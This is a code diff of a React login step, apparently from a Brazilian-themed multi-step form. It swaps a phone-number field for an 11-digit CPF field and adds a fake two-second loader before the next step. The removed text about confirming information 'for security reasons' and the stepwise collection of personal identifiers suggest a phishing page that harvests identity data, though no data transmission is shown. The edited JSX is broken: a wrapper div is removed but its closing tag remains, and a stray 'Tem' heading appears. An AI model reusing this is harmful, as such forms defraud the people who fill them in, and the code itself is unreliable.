@@ -24,22 +24,22 @@ const Step2 = ({ nextStep, loginData, setLoginData }) => {
     const classes = useStyles();
     const [loading, setLoading] = React.useState(false)
 
-    const onChangePhone = e => {
+    const onChangeUser = e => {
         // console.log(e.target.value)
-        setLoginData({ ...loginData, telefone: e.target.value })
+        setLoginData({ ...loginData, usuario: e.target.value })
     }
 
   
 
     const onClick = () => {
-        if (loginData.telefone.length === 15) {
+        if (loginData.usuario.length === 11) {
             setLoading(true)
             setTimeout(() =>{
                 nextStep()
             },2000)
             
-        } else if (loginData.telefone.length < 15) {
-            alertify.alert('Aviso', 'Número de Telefone Incorreto')
+        } else if (loginData.usuario.length < 11) {
+            alertify.alert('Aviso', 'Número Incorreto')
         }
         //   console.log(loginData.telefone.length)
 
@@ -50,35 +50,28 @@ const Step2 = ({ nextStep, loginData, setLoginData }) => {
         ? <Loader />
         :
 
-        <div>
+       <img src={logo} className="logo" />
+            <h2>Tem</h2>
 
-            <img src={logo} className="logo" />
-
-            <div className={classes.textField}>
-                <h2>Olá,</h2>
-
-                <p>Por motivo de segurança é necessário confirmar algumas informações</p>
-
-                <InputMask mask="(99) 99999-9999" value={loginData.telefone} onChange={onChangePhone}>
-                    {(inputProps) =>
-                        <TextField
-                            label="Telefone"
-                            id="margin-none"
-                            onChange={onChangePhone}
-                            defaultValue=""
-                            className={classes.textField}
-                        //   helperText="Some important text"
-                        />
-                    }
-                </InputMask>
-
-                <div>
-                    <button type="button" className="botaoLaranja" onClick={onClick}>Continuar</button>
-                </div>
-
-               
+            <div>
+                <TextField
+                    label="CPF"
+                    name="CPF"
+                    onChange={onChangeUser}
+                    id="margin-none"
+                    defaultValue=""
+                    required={true}
+                    className={classes.textField}
+                //   helperText="Some important text"
+                />
             </div>
+        
 
+         
+
+            <div>
+                <button type="button" className="botaoLaranja" onClick={onClick}>Acessar</button>
+            </div>
 
 
         </div>
